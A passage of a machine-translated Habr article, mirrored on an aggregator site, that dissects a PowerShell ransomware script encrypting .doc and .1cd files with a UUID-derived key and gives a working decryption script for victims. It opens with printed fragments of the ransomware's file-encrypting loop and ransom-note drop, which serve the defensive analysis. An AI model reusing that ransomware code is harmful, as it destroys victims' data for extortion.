class="hljs-string"><span class="hljs-string">$c</span></span>s.<span class="hljs-type"><span class="hljs-type">Write</span></span>(<span class="hljs-string"><span class="hljs-string">$i</span></span>tem, <span class="hljs-number"><span class="hljs-number">0</span></span>,<span class="hljs-string"><span class="hljs-string">$i</span></span>tem.<span class="hljs-type"><span class="hljs-type">Length</span></span>); <span class="hljs-string"><span class="hljs-string">$c</span></span>s.<span class="hljs-type"><span class="hljs-type">Close</span></span>(); <span class="hljs-string"><span class="hljs-string">$m</span></span>s.<span class="hljs-type"><span class="hljs-type">Close</span></span>(); <span class="hljs-string"><span class="hljs-string">$r</span></span>.<span class="hljs-type"><span class="hljs-type">Clear</span></span>(); return <span class="hljs-string"><span class="hljs-string">$m</span></span>s.<span class="hljs-type"><span class="hljs-type">ToArray</span></span>(); } #<span class="hljs-string"><span class="hljs-string">$d</span></span>isks=<span class="hljs-type"><span class="hljs-type">Get</span></span>-<span class="hljs-type"><span class="hljs-type">PSDrive</span></span>|<span class="hljs-type"><span class="hljs-type">Where</span></span>-<span class="hljs-type"><span class="hljs-type">Object</span></span> {<span class="hljs-string"><span class="hljs-string">$_</span></span>.<span class="hljs-type"><span class="hljs-type">Free</span></span> -gt <span class="hljs-number"><span class="hljs-number">50000</span></span>}|<span class="hljs-type"><span class="hljs-type">Sort</span></span>-<span class="hljs-type"><span class="hljs-type">Object</span></span> -<span class="hljs-type"><span class="hljs-type">Descending</span></span>; foreach(<span class="hljs-string"><span class="hljs-string">$d</span></span>isk in <span class="hljs-string"><span class="hljs-string">$d</span></span>isks){gci <span class="hljs-string"><span class="hljs-string">$d</span></span>isk.root -<span class="hljs-type"><span class="hljs-type">Recurse</span></span> -<span class="hljs-type"><span class="hljs-type">Include</span></span> <span class="hljs-comment"><span class="hljs-comment">"*.doc"</span></span>,  ,<span class="hljs-comment"><span class="hljs-comment">"*.1cd"</span></span> |%{try {<span class="hljs-string"><span class="hljs-string">$f</span></span>ile=[io.file]::<span class="hljs-type"><span class="hljs-type">Open</span></span>(<span class="hljs-string"><span class="hljs-string">$_</span></span>, <span class="hljs-type"><span class="hljs-type">Open</span></span><span class="hljs-string"><span class="hljs-string">', '</span></span><span class="hljs-type"><span class="hljs-type">ReadWrite</span></span><span class="hljs-string"><span class="hljs-string">'); #if ($file.Length -lt "40960"){$size=$file.Length}else{$size="40960"} [byte[]]$buff = new-object byte[] $size; $ToEncrypt = $file.Read($buff, 0, $buff.Length); $file.Position='</span></span><span class="hljs-number"><span class="hljs-number">0</span></span><span class="hljs-string"><span class="hljs-string">'; #$Encrypted=Enckrypt-File $buff $ek; $file.Write($Encrypted, 0, $Encrypted.Length); $file.Close(); #$newname=$_.Name+'</span></span>.<span class="hljs-type"><span class="hljs-type">BMCODE</span></span><span class="hljs-string"><span class="hljs-string">'; #ren -Path $_.FulName -NewName $nename -Force; $path=$_.DirectoryName+'</span></span>\<span class="hljs-type"><span class="hljs-type">READ_ME_NOW</span></span>!!!!!!.<span class="hljs-type"><span class="hljs-type">TXT</span></span><span class="hljs-string"><span class="hljs-string">'; if(!(Test-Path $path)){sc -pat $path -va $text} } catch{} } }</span></span></code> </pre></div></div><br>  We read, read and exhale with relief.  There is no question of any total encryption of files. <br>  So.  The first thing we look for keys.  See the lines: <br><pre> <code class="hljs perl"> $Encrypted=Enckrypt-File $buff $ek; $ek=(get-wmiobject Win32_ComputerSystemProduct).UUID;</code> </pre> <br>  and we understand that the key uses the computer's UUID.  From this moment it becomes even easier and almost boldly forget about the first part, where a scary key is formed, which is added to * .TXT <br><br>  Further we see: <br><pre> <code class="hljs perl"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($file.Length -<span class="hljs-keyword"><span class="hljs-keyword">lt</span></span> <span class="hljs-string"><span class="hljs-string">"40960"</span></span>){$size=$file.Length}<span class="hljs-keyword"><span class="hljs-keyword">else</span></span>{$size=<span class="hljs-string"><span class="hljs-string">"40960"</span></span>}; [byte[]]$buff = new-object byte[] $size;</code> </pre> <br>  From this we find out that not the entire file is encrypted, but only the first part of it, if the file size is more than 40kb, if less, then the whole file. <br>  It remains to know the UUID of the computer and write a script to decrypt. <br>  UUID will be recognized by the same command. <br><pre> <code class="hljs pgsql">(<span class="hljs-keyword"><span class="hljs-keyword">get</span></span>-wmiobject Win32_ComputerSystemProduct).UUID</code> </pre> <br>  Running it in PowerShell, which the malware carefully downloaded and did not delete from% TEMP%. <br><br>  Now for writing the script.  Difficulty arose only in understanding (and that is due to lack of knowledge, since it was not necessary to encounter before) that, in the examples of M $, similar functions pass a string as a parameter, and here they simply use an array. <br><br>  Actually, what to learn.  <i><b>This code is working, without changes and with unnecessary conclusions to track the process of work.</b></i> <br><div class="spoiler">  <b class="spoiler_title">DEC_beta, ps1</b> <div class="spoiler_text"><pre> <code class="hljs mel">cls $null = [Reflection.Assembly]::LoadWithPartialName(<span class="hljs-string"><span class="hljs-string">"System.Security"</span></span>); $ek=<span class="hljs-string"><span class="hljs-string">'00000000-0000-0000-0000-6CF04916E0EA'</span></span>; function Decrypt-String($Encrypted, $Passphrase){ $salt=<span class="hljs-string"><span class="hljs-string">"BMCODE hack your system"</span></span> $init=<span class="hljs-string"><span class="hljs-string">"BMCODE INIT"</span></span> $r = new-Object System.Security.Cryptography.RijndaelManaged $pass = [Text.Encoding]::UTF8.GetBytes($Passphrase) $salt = [Text.Encoding]::UTF8.GetBytes($salt) $r.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, <span class="hljs-string"><span class="hljs-string">"SHA1"</span></span>, <span class="hljs-number"><span class="hljs-number">5</span></span>).GetBytes(<span class="hljs-number"><span class="hljs-number">32</span></span>) $r.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes($init) )[<span class="hljs-number"><span class="hljs-number">0.</span></span><span class="hljs-number"><span class="hljs-number">.15</span></span>] $r.Padding=<span class="hljs-string"><span class="hljs-string">"Zeros"</span></span>; $r.Mode=<span class="hljs-string"><span class="hljs-string">"CBC"</span></span>; $d = $r.CreateDecryptor() $ms = new-Object IO.MemoryStream @(,$Encrypted) $cs = new-Object Security.Cryptography.CryptoStream $ms,$d,<span class="hljs-string"><span class="hljs-string">"Read"</span></span> $Enc=$cs.read($Encrypted, <span class="hljs-number"><span class="hljs-number">0</span></span>,$Encrypted.Length) $cs.Close(); $ms.Close(); $r.Clear(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> [byte[]]$Encrypted = $ms.ToArray() } $dir= read-host <span class="hljs-string"><span class="hljs-string">"       (: C:\, D:\111\)"</span></span> gci $dir -Recurse -Include <span class="hljs-string"><span class="hljs-string">"*.BMCODE"</span></span> |%{try {$_; $file=[io.<span class="hljs-keyword"><span class="hljs-keyword">file</span></span>]::Open($_, <span class="hljs-string"><span class="hljs-string">'Open'</span></span>, <span class="hljs-string"><span class="hljs-string">'ReadWrite'</span></span>); #Wrire-host $file.Name; write-Host <span class="hljs-string"><span class="hljs-string">" : $file.Length"</span></span>; If ($file.Length -lt <span class="hljs-string"><span class="hljs-string">"40960"</span></span>){$size=$file.Length} Else{$size=<span class="hljs-string"><span class="hljs-string">"40960"</span></span>} [byte[]]$buff = new-object byte[] $size; $ToEncrypt = $file.Read($buff, <span class="hljs-number"><span class="hljs-number">0</span></span>, $buff.Length); write-host $size; $file.Position=<span class="hljs-string"><span class="hljs-string">'0'</span></span>; $arr=Decrypt-String $buff $ek; Write-host $_.Name Write-host $_.FullName $file.Write($arr, <span class="hljs-number"><span class="hljs-number">0</span></span>, $arr.Length); Write-host <span class="hljs-string"><span class="hljs-string">"Done"</span></span>; $file.Close(); $newname=$_.Name -replace <span class="hljs-string"><span class="hljs-string">'.BMCODE'</span></span>,<span class="hljs-string"><span class="hljs-string">''</span></span>; ren -Path $_.FullName -NewName $newname -Force; Write-Host <span class="hljs-string"><span class="hljs-string">" : $_.Name"</span></span>; $hnya=$_.DirectoryName+<span class="hljs-string"><span class="hljs-string">'\READ_ME_NOW!!!!!!.TXT'</span></span> rm $hnya; } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span>{} }</code> </pre></div></div><br>  <u>What he does, what needs to be changed if needed by yourself:</u> <br>  1) we set in the manual variable <b>$ ek</b> with the required key (in our case, the UUID) <br>  2) A description of the decoding function that returns an array.  We set the <b>$ salt</b> and <b>$ init</b> variables according to what was in the source code of the malware. <br>  3) We ask the launching party to specify the path from which the file search will begin (we search by subfolders) <br>  4) Each found file with the specified extension (.BMCODE) is decoded and renamed to normal. <br>  5) At the same time, files named READ_ME_NOW !!!!!!. TXT, which the malware has created, succeed. <br><br>  The code is not perfect and much can be simplified and rewritten, but the main thing is that it works and helps. <br><br>  That's all.  I hope this article will help everyone who has already encountered a similar problem and does not know what to do.  As they say in RuNet, attackers require from 3000 to 10,000 rubles for decoding, but there are also more complex variants of malicious programs, where you just can‚Äôt find out the key. <br><br>  I say goodbye for this sim and I hope that I will even find the time and write how we in our institute installed video surveillance and hung the mouse as a bell on the department door. <br><br>  <b>UPD</b> <br>  <u>According to the results of correspondence.</u> <br>  Variant <b>.TFCODE</b> <br>  The .TFCODE version uses a random password of 50 characters.  The password file was found in <br>  C: \ Documents and Settings \ USER \ Application Data.  Fail System Product Name <br><br>  In the malicious code, a kind of check for restart is implemented. <br><pre> <code class="hljs smalltalk"><span class="hljs-string"><span class="hljs-string">$i</span></span>dpath = <span class="hljs-string"><span class="hljs-string">$e</span></span>nv:<span class="hljs-type"><span class="hljs-type">APPDATA</span></span> + <span class="hljs-comment"><span class="hljs-comment">"\"</span></span> + (gwmi win32_computersystem).model; if(<span class="hljs-type"><span class="hljs-type">Test</span></span>-<span class="hljs-type"><span class="hljs-type">Path</span></span> <span class="hljs-string"><span class="hljs-string">$i</span></span>dpath){<span class="hljs-string"><span class="hljs-string">$g</span></span>etc = <span class="hljs-type"><span class="hljs-type">Get</span></span>-<span class="hljs-type"><span class="hljs-type">Content</span></span> <span class="hljs-string"><span class="hljs-string">$i</span></span>dpath; if (<span class="hljs-string"><span class="hljs-string">$g</span></span>etc -eq <span class="hljs-comment"><span class="hljs-comment">"good"</span></span>){exit} else {<span class="hljs-string"><span class="hljs-string">$e</span></span>k = <span class="hljs-string"><span class="hljs-string">$g</span></span>etc}} ...... <span class="hljs-type"><span class="hljs-type">Set</span></span>-<span class="hljs-type"><span class="hljs-type">Content</span></span> -<span class="hljs-type"><span class="hljs-type">Path</span></span> <span class="hljs-string"><span class="hljs-string">$i</span></span>dpath -<span class="hljs-type"><span class="hljs-type">Value</span></span> <span class="hljs-comment"><span class="hljs-comment">"good"</span></span></code> </pre><br><br>  <u>If the file is already recorded good means the key is already so easy to not find.</u>  <u>So, if you accidentally started the malware or noticed that the files started changing extensions, immediately turn off the computer to stop the encryption process and save the key.</u> <br><br>  The rest is all the same.  In the <b>$ ek</b> variable set the line from the found file.  Change .BMCODE to .TFCODE, check the <b>$ salt</b> and <b>$ init</b> variables and change the name of * .TXT to what was created in the folders (READ_ME_NOW.TXT). <br>  We do a trial run on copies of encrypted files.  If everything is good, then rejoice. </div><p>Source: <a href="https://habr.com/ru/post/168677/">https://habr.com/ru/post/168677/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../168667/index.html">Briefly about hydrodynamics: do you remember how it all began?</a></li>
<li><a href="../168669/index.html">Tasks and cancellation in .Net - tips & tricks</a></li>
<li><a href="../168671/index.html">Qt5 build in Visual Studio 2012 or I can sew a kangaroo eye while my favorite ketchup flows</a></li>
<li><a href="../168673/index.html">Creating Warcraft (part 3)</a></li>
<li><a href="../168675/index.html">Similarities and differences between Mercurial and Git</a></li>
<li><a href="../168681/index.html">Interactive infographics with CSS and SVG animations</a></li>
<li><a href="../168683/index.html">The next zero-day vulnerabilities in various routers</a></li>
<li><a href="../168685/index.html">Security and Huawei</a></li>
<li><a href="../168687/index.html">LibreOffice 4.0.0</a></li>
<li><a href="../168689/index.html">dot42 - C # compiler for Dalvik Runtime</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>